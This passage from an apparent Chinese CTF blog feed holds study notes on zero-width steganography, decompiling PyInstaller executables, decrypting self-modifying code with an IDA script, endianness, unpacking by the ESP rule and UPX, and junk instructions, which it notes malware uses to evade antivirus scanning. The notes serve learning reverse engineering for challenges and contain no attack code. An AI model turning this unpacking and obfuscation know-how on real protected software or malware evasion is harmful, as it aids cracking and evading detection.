‌‌‌‌‍‬‌﻿​​​​​​​magnis‌‌‌‌‌﻿‌‍‌‌‌‌‌﻿‌‍ dis ​​​​​​​‌‌‌‌‍‍﻿﻿parturient montes, ​​​​​​​nascetur ridiculus ‌‌‌‌‌﻿‍‌​​​​​​​​​​​​​​‌‌‌‌‌﻿‬‍mus. In finibus‌‌‌‌‌﻿‌‬ magna​​​​​​‌‌‌‌‌﻿‍﻿ mauris, quis‌‌‌‌‍‬‌‍ auctor ‌‌‌‌‍‬‌‍libero congue quis. ‌‌‌‌‍‬‬‬Duis‌‌‌‌‍‬‌‬ sagittis consequat urna non tristique. Pellentesque eu lorem ‌‌‌‌‍﻿‌‍id‌‌‌‌‍‬‬﻿ quam vestibulum ultricies vel ac purus‌‌‌‌‌﻿‌‍.<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>在 Windows 的文本编辑器下，会出现一些混乱：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E9%9A%90%E5%86%99%E6%9C%AF-%E9%9B%B6%E5%AE%BD%E5%BA%A6%E5%AD%97%E7%AC%A6%E9%9A%90%E5%86%993.png" alt="隐写术-零宽度字符隐写3.png"></p><p>而在 010 Editor 下则可以看见许多空白字符：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E9%9A%90%E5%86%99%E6%9C%AF-%E9%9B%B6%E5%AE%BD%E5%BA%A6%E5%AD%97%E7%AC%A6%E9%9A%90%E5%86%994.png" alt="隐写术-零宽度字符隐写4.png"></p><p>在 Kali Linux 的文本编辑器 gedit 下未见异常：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E9%9A%90%E5%86%99%E6%9C%AF-%E9%9B%B6%E5%AE%BD%E5%BA%A6%E5%AD%97%E7%AC%A6%E9%9A%90%E5%86%991.png" alt="隐写术-零宽度字符隐写1.png"></p><p>但如果使用 vim 打开，就可以看到很多不可见字符：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E9%9A%90%E5%86%99%E6%9C%AF-%E9%9B%B6%E5%AE%BD%E5%BA%A6%E5%AD%97%E7%AC%A6%E9%9A%90%E5%86%992.png" alt="隐写术-零宽度字符隐写2.png"></p><p>根据以上特点基本可以确定为零宽度字符隐写</p><ul><li>在线工具：</li></ul><ol><li><p><a href="https://www.mzy0.com/ctftools/zerowidth1/">Unicode Steganography with Zero-Width Characters</a></p></li><li><p><a href="https://330k.github.io/misc_tools/unicode_steganography.html">Unicode Steganography with Zero-Width Characters</a></p></li></ol><ul><li>使用 <code>zwsp-steg-py</code> 库</li></ul><p>Github 仓库：<a href="https://github.com/enodari/zwsp-steg-py">enodari&#x2F;zwsp-steg-py: Zero-Width Space Steganography, encodes&#x2F;decodes hidden messages as non printable&#x2F;readable characters.</a></p><p>安装：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">pip <span class="token function">install</span> zwsp-steg-py<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>脚本：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#!/usr/bin/python  </span><span class="token comment"># -*- coding: utf-8 -*-  </span><span class="token keyword">import</span> zwsp_steg    decoded <span class="token operator">=</span> zwsp_steg<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'隐写字符串'</span><span class="token punctuation">,</span> zwsp_steg<span class="token punctuation">.</span>MODE_FULL<span class="token punctuation">)</span>   <span class="token comment"># 另一种模式：zwsp_steg.MODE_ZWSP</span><span class="token keyword">print</span><span class="token punctuation">(</span>decoded<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> 安全杂项 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Misc </tag>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Python逆向</title>
      <link href="/posts/19655b58.html"/>
      <url>/posts/19655b58.html</url>
      
        <content type="html"><![CDATA[<h1 id="Python逆向特点"><a href="#Python逆向特点" class="headerlink" title="Python逆向特点"></a>Python逆向特点</h1><ul><li>在 exeinfo pe 中查看到文件信息：</li></ul><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF%20-%20Reverse_Python%E9%80%86%E5%90%911.png" alt="CTF - Reverse_Python逆向1.png"></p><ul><li><p><mark>在文件信息中出现 PyInstaller 即为 Python 文件经过 pyinstaller 打包生成的可执行 .exe 文件</mark>  </p></li><li><p>这类由 Python 生成的可执行文件无法通过 IDA 反编译，需要使用 <code>pyinstxtractor.py</code> 文件进行解包得到 Python 的反编译文件 .pyc</p></li></ul><hr><h1 id="Python-逆向流程"><a href="#Python-逆向流程" class="headerlink" title="Python 逆向流程"></a>Python 逆向流程</h1><ol><li>下载 <code>pyinstxtractor.py</code> 工具包：<a href="https://github.com/extremecoders-re/pyinstxtractor">GitHub - extremecoders-re&#x2F;pyinstxtractor: PyInstaller Extractor</a></li></ol><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF%20-%20Reverse_Python%E9%80%86%E5%90%912.png" alt="CTF - Reverse_Python逆向2.png"></p><ol start="2"><li><p>将 <code>pyinstxtractor.py</code> 文件置于 pyinstaller 打包成的 .exe 文件夹下</p></li><li><p>在该目录下执行 cmd，输入：</p></li></ol><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">python pyinstxtractor.py exe文件名<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ol start="4"><li>转换后会在该目录下生成一个文件夹，其中必定存在一个无后缀名的 <code>struct</code> 文件，通过 exeinfo pe 可查看该文件为 .pyc 文件 <mark>【必要时可用它恢复文件头】</mark></li></ol><hr><h1 id="pyc-反编译"><a href="#pyc-反编译" class="headerlink" title="pyc 反编译"></a>pyc 反编译</h1><ul><li>安装 uncompyle6：</li></ul><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">pip <span class="token function">install</span> uncompyle6<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li>在 .pyc 文件目录下，执行 cmd：</li></ul><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">uncompyle6 pyc文件名uncompyle6 <span class="token parameter variable">-o</span> py文件名 pyc文件名<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><blockquote><p>若 Python 版本不对，会提示 KeyError: ‘3.10.4’ （ 3.10.4 为 Python 版本）</p></blockquote><hr><h1 id="获取-pyc-文件头"><a href="#获取-pyc-文件头" class="headerlink" title="获取 pyc 文件头"></a>获取 pyc 文件头</h1><ul><li>方法一，通过 Pycharm 手动生成 .pyc 文件，获取文件头</li></ul><p>代码如下：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># 代码开头需导入py_compile</span><span class="token keyword">import</span> py_compile<span class="token comment"># 随意写正确的python代码即可</span><span class="token keyword">def</span> <span class="token function">print_hi</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'Hi, </span><span class="token interpolation"><span class="token punctuation">&#123;</span>name<span class="token punctuation">&#125;</span></span><span class="token string">'</span></span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>print_hi<span class="token punctuation">(</span><span class="token string">'PyCharm'</span><span class="token punctuation">)</span><span class="token comment"># 最后调用该函数进行编译操作，单引号中是保存路径</span>py_compile<span class="token punctuation">.</span><span class="token builtin">compile</span><span class="token punctuation">(</span><span class="token string">r'D:\py_project'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li>方法二，通过 cmd 命令生成 .pyc 文件</li></ul><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">python <span class="token parameter variable">-m</span> py_compile py文件名<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> 逆向工程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Reverse </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SMC代码自修改</title>
      <link href="/posts/590ea956.html"/>
      <url>/posts/590ea956.html</url>
      
        <content type="html"><![CDATA[<h1 id="SMC"><a href="#SMC" class="headerlink" title="SMC"></a>SMC</h1><blockquote><p><strong>代码自修改</strong>，简而言之，就是程序中的部分代码在运行之前被加密成一段数据，不可反编译，通过程序运行后执行相关的解码功能，对加密的代码数据进行解密，让其恢复正常功能</p></blockquote><hr><h1 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h1><blockquote><p>通过 SMC 代码自修改技术可以实现程序的保护，同时也可以将一些特征代码变形隐藏</p></blockquote><ol><li>代码在二进制文件中就是字节码，本身也就是一段二进制数据</li><li>提前将一部分代码通过某些方式替换为加密数据</li><li><strong>程序在被反编译的时候，核心代码就是一串数据，无法反编译，而程序在运行的时候又能成功将这段核心代码复原</strong></li></ol><hr><h1 id="SMC-示例"><a href="#SMC-示例" class="headerlink" title="SMC 示例"></a>SMC 示例</h1><blockquote><p>以 <em>《<a href="%E3%80%90%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E3%80%91BABYRE.md">【攻防世界】BABYRE</a>》</em> 这道题为例</p></blockquote><ol><li>可以看到程序一开始就使用了一个 182 次的 for 循环对数组 <code>judge[]</code> 进行异或操作，但是在后面，又以函数的形式来调用 <code>judge()</code></li></ol><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/SMC%E8%87%AA%E8%A7%A3%E7%A0%811.png" alt="SMC自解码1.png"></p><ol start="2"><li>跟进看到 <code>judge</code> 的内容</li></ol><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/SMC%E8%87%AA%E8%A7%A3%E7%A0%812.png" alt="SMC自解码2.png">  </p><p>形似数组一样的数据，但为什么可以作为函数调用呢？</p><ol start="3"><li>其实这就是 SMC 代码自修改</li></ol><p>这里的 <code>judge</code> 本来就是一个函数，只是它的函数内容需要先经过对所有 182 个元素进行异或，异或后才能得到真正的 <code>judge()</code> 函数</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">for</span> <span class="token punctuation">(</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> <span class="token number">181</span><span class="token punctuation">;</span> <span class="token operator">++</span>i <span class="token punctuation">)</span>  judge<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">^=</span> <span class="token number">0xCu</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><ol start="4"><li>但是这种行为 IDA 是不知道的，IDA 以为异或前的 <code>judge</code> 只是一个普通的数组，所以识别成了 <code>char judge[182]</code> 的数组；而随着程序执行异或之后，<code>judge</code> 的内容被还原，IDA 又可以将 <code>judge</code> 识别成函数 <code>*(unsigned int (__fastcall **)(char *))judge</code> 了</li></ol><hr><h1 id="SMC-破解"><a href="#SMC-破解" class="headerlink" title="SMC 破解"></a>SMC 破解</h1><blockquote><p>还是以《<em>攻防世界-BABYRE</em>》这道题为例</p></blockquote><ol><li>明白了 SMC 代码自修改的原理之后，其实破解方法比较简单</li></ol><p>直接按照程序自己解密的逻辑来对数据进行解密即可  </p><p>比如这里是对 <code>judge</code> 所有的数据进行异或</p><ol start="2"><li>但是 <code>judge</code> 数据量比较大，所以通过 IDA 脚本来实现</li></ol><p><code>shift + F2</code> 打开脚本编辑器，输入代码：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">address <span class="token operator">=</span> <span class="token number">0x600B00</span>  <span class="token comment"># judge的首地址</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">182</span><span class="token punctuation">)</span><span class="token punctuation">:</span>  <span class="token comment"># 进行182次异或并修改IDA中的数据</span>ida_bytes<span class="token punctuation">.</span>patch_byte<span class="token punctuation">(</span>address <span class="token operator">+</span> i<span class="token punctuation">,</span> idc<span class="token punctuation">.</span>get_wide_byte<span class="token punctuation">(</span>address <span class="token operator">+</span> i<span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token number">0xC</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Done"</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ol start="3"><li>可以看到修改前后数据的变化</li></ol><p>脚本执行前：  </p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C_BABYRE4.png" alt="攻防世界_BABYRE4.png">  </p><p>脚本执行后：  </p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C_BABYRE5.png" alt="攻防世界_BABYRE5.png"></p><ol start="4"><li>然后在 <code>judge</code> 的首地址处，使用 <code>快捷键 C</code> 将数据生成代码</li></ol><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C_BABYRE6.png" alt="攻防世界_BABYRE6.png">  </p><p>接着使用 <code>快捷键 P</code> 将代码生成函数  </p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C_BABYRE8.png" alt="攻防世界_BABYRE8.png">  </p><p>最后 <code>F5</code> 即可看到破解 SMC 后正常的 <code>judge()</code> 函数了  </p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C_BABYRE9.png" alt="攻防世界_BABYRE9.png"></p>]]></content>
      
      
      <categories>
          
          <category> 逆向工程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Reverse </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>大端序和小端序</title>
      <link href="/posts/fa84c0bb.html"/>
      <url>/posts/fa84c0bb.html</url>
      
        <content type="html"><![CDATA[<h1 id="字节存储顺序"><a href="#字节存储顺序" class="headerlink" title="字节存储顺序"></a>字节存储顺序</h1><blockquote><p>主要分为 大端序（Big-endian）和小端序（Little-endian），区别如下：<br><mark>大端序</mark>：<code>高位字节 -&gt; 低地址</code>，低位字节 -&gt; 高地址<br><mark>小端序</mark>：<code>低位字节 -&gt; 低地址</code>，高位字节 -&gt; 高地址</p></blockquote><hr><h2 id="图解"><a href="#图解" class="headerlink" title="图解"></a>图解</h2><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF%20-%20Reverse_%E5%A4%A7%E7%AB%AF%E5%BA%8F%E5%92%8C%E5%B0%8F%E7%AB%AF%E5%BA%8F1.png" alt="CTF - Reverse_大端序和小端序1.png"></p><blockquote><p><em><strong>不管是大端法还是小端法存储，计算机在内存中存放数据的顺序都是从低地址到高地址</strong></em><br><em><strong>不同的是，取低字节的数据存放在低地址，还是取高字节数据存放在低地址</strong></em></p></blockquote><ul><li><strong>若为常见的大小类型（如 int）， 则是 顺序（高位在左）</strong></li><li><strong>若为其他的大小类型（如 int64），则是 逆序（高位在右）</strong></li></ul><h2 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h2><ul><li>例如，将 <code>12345678h</code> 写入 <code>1000h</code> 开始的内存中，以大端序和小端序模式存放结果如下：<br><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF%20-%20Reverse_%E5%A4%A7%E7%AB%AF%E5%BA%8F%E5%92%8C%E5%B0%8F%E7%AB%AF%E5%BA%8F2.png" alt="CTF - Reverse_大端序和小端序2.png"></li></ul><ol><li>在小端顺序里， <code>v1 = 0x12345678</code> 在内存的字节码中看起来是这样 <code>78h 56h 34h 12h</code>，这没有问题<br>如果这时有 <code>v2 = 0x1234</code>，在内存的字节码中看起来是 <code>34h 12h</code></li><li>假如 <code>v2</code> 后面紧接着 <code>v1</code> 的话，字节码应该就是 <code>34h 12h 78h 56h 34h 12h</code><br>再放一个 <code>v3 = 0x12</code> 的话，总的排序就是 <code>12h 34h 12h 78h 56h 34h 12h</code></li></ol><blockquote><p>一般来说，x86 系列 CPU 都是 Little-endian 字节序，PowerPC 通常是 Big-endian 字节序<br>但是对于 [1, 2, 3, 4] 这么一个数组，并不会受到字节序的影响。它的排序无论大端序还是小端序都是一样的</p></blockquote><hr><h1 id="IDA-中的小端序"><a href="#IDA-中的小端序" class="headerlink" title="IDA 中的小端序"></a>IDA 中的小端序</h1><h2 id="DWORD"><a href="#DWORD" class="headerlink" title="_DWORD"></a>_DWORD</h2><ul><li>在 IDA 中，F5 查看伪代码后，如果看到：<pre class="line-numbers language-c" data-language="c"><code class="language-c">_DWORD v4<span class="token punctuation">[</span><span class="token number">7</span><span class="token punctuation">]</span><span class="token punctuation">;</span>v4<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0xD6C0B67</span><span class="token punctuation">;</span>v4<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0x175F4078</span><span class="token punctuation">;</span>v4<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0x3302058</span><span class="token punctuation">;</span>v4<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0x725D1244</span><span class="token punctuation">;</span>v4<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0x2E1F3441</span><span class="token punctuation">;</span>v4<span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0x6847404D</span><span class="token punctuation">;</span>v4<span class="token punctuation">[</span><span class="token number">6</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0x1B</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>注意最开始的数据类型，这个数组<strong>不仅要按照4字节左侧补零对齐，还要将每一组数据翻转拼接才能得到正确的字符串</strong>，IDA 并没有非常智能地捋顺字符串，所以初学的话非常有迷惑性</p><p>例如：<br><code>v4[2] = 0x3302058；</code><br>应为 <code>0x03302058 --&gt; 0x58，0x20，0x30，0x03</code></p></blockquote></li></ul><hr><h2 id="db、dw、dd、dq"><a href="#db、dw、dd、dq" class="headerlink" title="db、dw、dd、dq"></a>db、dw、dd、dq</h2><blockquote><p>伪指令 db、dw、dd、dq 都可以定义字符串，但最多的是用 db 来定义字符串</p></blockquote><ol><li>第一个原因是 dw、dd定义的字符串到了内存中排序是相反的<ul><li><strong>在字符串 “abcd” 中，元素按从 高位 向 低位 线性排序</strong></li><li><strong>在内存中，数据由 低位 向 高位 线性排序</strong></li><li>因此字符串 “abcd” 在内存中的顺序是从 低位 向 高位 排序的，所以相反，即 小端序</li></ul></li><li>第二个原因是 不同版本编译器对 dw 与 dd 定义字符串的指令格式支持不一样<ul><li>db 定义字节类型变量，一个字节数据占 1个 字节单元，读完一个，偏移量加 1 （ 1个 十六进制数）</li><li>dw 定义字类型变量，一个字数据占 2个 字节单元，读完一个，偏移量加 2 （ 2个 十六进制数）</li><li>dd 定义双字类型变量，一个双字数据占 4个 字节单元，读完一个，偏移量加 4 （ 4个 十六进制数）</li><li>dq 定义四字类型变量，一个四字数据占 8个 字节单元，读完一个，偏移量加 8 （ 8个 十六进制数）</li></ul></li><li><strong>db 是一字节，按顺序一个一个存储</strong><ul><li><em>用 db 定义字符串时，存储方式是顺着的，即 大端序</em></li></ul></li></ol>]]></content>
      
      
      <categories>
          
          <category> 逆向工程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Reverse </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>常见脱壳方法</title>
      <link href="/posts/55679f02.html"/>
      <url>/posts/55679f02.html</url>
      
        <content type="html"><![CDATA[<h1 id="壳的原理"><a href="#壳的原理" class="headerlink" title="壳的原理"></a>壳的原理</h1><blockquote><p>壳是最早出现的一种专用加密软件技术。<strong>壳实质上是一个子程序，它在某些方面和病毒类似，都需要比源程序代码更早地获得控制权</strong></p><p>壳通过修改源程序执行文件的组织结构，但不会影响源程序的正常运行，在程序运行时抢先取得控制权后，对程序进行压缩等加密操作，隐藏程序真正的 <code>OEP</code>（源程序入口点）（大多数病毒就是基于此原理，防止被杀毒软件扫描）</p></blockquote><hr><h1 id="手动脱壳"><a href="#手动脱壳" class="headerlink" title="手动脱壳"></a>手动脱壳</h1><blockquote><p>对于一些加密壳、修改壳，目前并没有脱壳机，必须手动分析脱壳</p><p><strong>手动脱壳的目的就是要找出程序真正的 <code>OEP</code>（源程序入口点）位置</strong></p></blockquote><ul><li>手动脱壳一般分为三步：<ol><li>查找真正的程序入口点</li><li>抓取内存映像文件</li><li>重建 PE 文件</li></ol></li></ul><blockquote><p>在程序执行时，外壳代码会首先获取控制权，模拟 Windows 加载器，将原来的程序恢复到内存中，这时内存中的数据就是加壳前的映像文件了。适时对映像文件进行抓取和修改，就可以将其还原到加壳前的状态</p></blockquote><hr><h1 id="ESP-脱壳定律"><a href="#ESP-脱壳定律" class="headerlink" title="ESP 脱壳定律"></a>ESP 脱壳定律</h1><blockquote><p>ESP 脱壳定律又称堆栈平衡定律，即：通过合理利用程序中的堆栈平衡来进行脱壳</p><p>特点：载入程序后只有 ESP 寄存器内容发生变化（<strong>单步 F8 后发现只有 ESP 寄存器变红</strong>）<br>适用范围：几乎全部的压缩壳， 一些早期的加密壳</p></blockquote><p><mark>以 <em>《<a href="%E3%80%90%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E3%80%91BabyXor.md">【攻防世界】BabyXor</a>》</em> 这道题为例，ESP 脱壳步骤与此类似</mark></p><ol><li>从 <code>pushad</code> 开始</li></ol><p><strong>先 F8 单步步过一次</strong>：  </p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C_BabyXor6.png" alt="攻防世界_BabyXor6.png">  </p><p><strong>观察右侧寄存器窗口，发现 EAX ~ EDI 中只有 ESP 为红色，说明可以使用 ESP 定律进行脱壳</strong></p><ol start="2"><li>在寄存器窗口中选中 ESP，<code>右键 --&gt; 数据窗口中跟随</code></li></ol><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C_BabyXor7.png" alt="攻防世界_BabyXor7.png">  </p><p>注意数据窗口中是否跳转：  </p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C_BabyXor8.png" alt="攻防世界_BabyXor8.png">  </p><p>从该地址处的第一个字节开始（我这里是 00），<strong>左键选择任意长度的数据</strong>  </p><p>然后<code>右键 --&gt; 断点 --&gt; 硬件访问 --&gt; Byte/Word/Dword</code>（三选一，均可）  </p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C_BabyXor9.png" alt="攻防世界_BabyXor9.png">  </p><p>检查一下断点是否成功：<code>调试 --&gt; 硬件断点</code>  </p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C_BabyXor10.png" alt="攻防世界_BabyXor10.png">  </p><p>直接 <code>F9</code> 运行程序  </p><p>然后 <code>F8</code> 连续单步步过找到 OEP（程序的入口点）  </p><p>程序停在地址 <code>0x0043F019</code> 的位置  </p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C_BabyXor11.png" alt="攻防世界_BabyXor11.png"><br>在脱壳之前，先删除前面下的断点：  </p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C_BabyXor12.png" alt="攻防世界_BabyXor12.png"></p><p>在停下的地址处：<code>右键 --&gt; 用 OllyDump脱壳调试进程</code>  </p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C_BabyXor13.png" alt="攻防世界_BabyXor13.png">  </p><p>点击脱壳，并将脱壳后的程序进行保存  </p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C_BabyXor14.png" alt="攻防世界_BabyXor14.png"></p><ol start="3"><li>将保存后的程序用 exeinfo PE 打开：</li></ol><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C_BabyXor15.png" alt="攻防世界_BabyXor15.png"><br>   已经显示无壳</p><ol start="4"><li>如果脱壳后的程序，用 IDA 分析是正常的，但是却无法双击运行，可以尝试：<ul><li>在 <code>右键 --&gt; 用 OllyDump脱壳调试进程</code> 进行脱壳的时候，左下角选择 <code>方式2：在脱壳文件中搜索 DLL &amp; API 名称</code></li><li>重新勾选重建输入表</li></ul></li></ol><blockquote><p>ESP 脱壳定律的原理：</p><ol><li>在程序自解密或者自解压过程中，不少壳会先将当前寄存器内容压栈，如使用 <code>pushad</code></li><li>在解压结束后，会将之前的寄存器值出栈，如使用 <code>popad</code></li><li>在寄存器出栈时，往往程序代码被自动恢复，此时硬件断点触发（这也是我们下硬件断点的原因）</li><li>然后在程序当前位置，只需要少许 <code>F8</code> 单步跟踪，就很容易到达真正的 <code>OEP</code> 位置</li></ol></blockquote><hr><h1 id="UPX-壳"><a href="#UPX-壳" class="headerlink" title="UPX 壳"></a>UPX 壳</h1><blockquote><p>UPX 壳是一种压缩壳，原理：首先将程序压缩，一方面在程序的开头或者其他合适的地方插入一段代码，另一方面是将程序的其他地方做压缩</p><p>压缩也可以叫做加密，因为压缩后的程序比较难看懂，和原来的代码有很大的不同</p></blockquote><hr><h2 id="UPX-脱壳工具"><a href="#UPX-脱壳工具" class="headerlink" title="UPX 脱壳工具"></a>UPX 脱壳工具</h2><blockquote><p>UPX 脱壳有一些自动化工具，比较方便</p></blockquote><p>下载地址：<a href="https://fossies.org/windows/misc/upx-3.96-win64.zip/">upx 3.96-win64 - Download</a></p><hr><h2 id="脱壳流程"><a href="#脱壳流程" class="headerlink" title="脱壳流程"></a>脱壳流程</h2><ol><li><p>将加壳文件置于脱壳工具解压后的文件夹下，例如：<code>D:\upx-3.96-win64</code></p></li><li><p>相关命令：</p></li></ol><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">upx <span class="token parameter variable">-d</span> 文件名   <span class="token comment"># 脱壳</span>upx 文件名      <span class="token comment"># 加壳</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF%20-%20Reverse_upx%20%E8%84%B1%E5%A3%B31.png" alt="CTF - Reverse_upx 脱壳1.png"></p>]]></content>
      
      
      <categories>
          
          <category> 逆向工程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Reverse </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>花指令</title>
      <link href="/posts/9ffaa92b.html"/>
      <url>/posts/9ffaa92b.html</url>
      
        <content type="html"><![CDATA[<h1 id="花指令的原理（代码与数据混合）"><a href="#花指令的原理（代码与数据混合）" class="headerlink" title="花指令的原理（代码与数据混合）"></a>花指令的原理（代码与数据混合）</h1><blockquote><p>花指令实质就是一串垃圾指令，它与程序本身的功能无关，并不影响程序本身的逻辑</p><p>在软件保护中，花指令被作为一种手段来增加静态分析的难度，花指令也可以被用在病毒或木马上，通过加入花指令改变程序的特征码，躲避杀软的扫描，从而达到免杀的目的</p></blockquote><blockquote><p><em><strong>花指令是对抗反汇编的有效手段之一。目的是干扰 IDA 和 OD 等软件对程序的静态分析，使这些软件无法正常反汇编出原始代码</strong></em></p><p><strong>花指令分为两类：可执行的花指令、不可执行的花指令</strong></p></blockquote><hr><h2 id="常用的两类反汇编算法"><a href="#常用的两类反汇编算法" class="headerlink" title="常用的两类反汇编算法"></a>常用的两类反汇编算法</h2><ol><li><mark>线性扫描算法</mark> —— <em>逐行反汇编（无法将数据和内容进行区分）</em><ul><li><u>将遇到的每一条指令都解析成汇编指令</u>。没有对反汇编的内容进行判断，因而无法正确区分代码和数据，一些数据也会被当成代码来解码</li><li>例如：简单的花指令 <code>0xE8</code> 是跳转指令，可以对线性扫描算法进行干扰，但是递归扫描算法可以正常分析</li></ul></li></ol><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF%20-%20Reverse_%E8%8A%B1%E6%8C%87%E4%BB%A41.png" alt="CTF - Reverse_花指令1.png"></p><ol start="2"><li><mark>递归行进算法</mark> —— 